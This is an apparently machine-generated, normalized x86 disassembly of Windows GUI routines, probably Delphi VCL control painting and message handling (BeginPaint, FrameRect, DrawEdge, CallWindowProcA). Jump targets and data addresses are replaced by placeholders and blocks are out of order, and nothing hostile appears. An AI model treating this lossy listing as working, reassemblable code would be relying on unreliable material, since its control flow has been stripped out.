pop ecx
mov [ fs : eax ] edx
push sub_441f02
call sub_43c8ec
call sub_420770
retn
sub_441f2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_41256c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406994
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43f0c4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_441fe4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4139c8
call sub_441f2c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4139c8
call sub_441f2c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_442078
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4446f8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406980
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_441fe4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406994
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43f0c4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44210c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43e680
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43f190
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_442078
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406980
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43da08
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_441fe4
test eax eax
je r-xdata
mov eax ebx
call sub_455b0c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43f190
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_4446f8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4446f8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43f0c4
sub_442270
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43f324
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43f0c4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41ce58
call sub_41c1d4
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41ce94
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43da64
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_442378
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_43ad50
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43f0c4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_4423ac
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4424cc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_442504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424d3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4139c8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_442504
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413a24
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412594
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4139c8
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c1d4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412594
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c1d4
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412594
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43c800
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43f0c4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_442734
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43c800
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_4446f8
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43f0c4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43f0c4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43c800
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_442734
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4139c8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_442888
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4423ac
jmp r-xdata
mov eax ebx
call sub_441428
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4429da
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4446f8
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43f0c4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_442888
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_4446f8
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4429e8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a08
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a7c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442a9c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442abc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442ae0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b04
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b28
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_442378
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_442b4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42f650
mov edi eax
mov eax edi
call sub_42f730
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41ce94
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4446f8
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42f8c8
jmp r-xdata
sub_442bd4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43f9f8
test bl bl
je r-xdata
mov eax edi
call sub_444a08
mov eax edi
call sub_444600
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_444600
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_442c94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43f654
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_442ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_444a08
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_440fb8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403468
sub_442d2c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43da08
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_441fe4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e428
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c910
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_442e7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_442f5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f62
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_4446f8
mov dl [ ebx + 0x184 ]
call sub_44939c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c888
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d2c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c688
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c688
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c688
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_442f68
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442ff2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442ff9
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c888
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407d2c
test eax eax
je r-xdata
mov eax ebx
call sub_4446f8
mov dl 0x1
call sub_449380
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_443054
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412584
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43f0c4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_4430a4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_4430d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403468
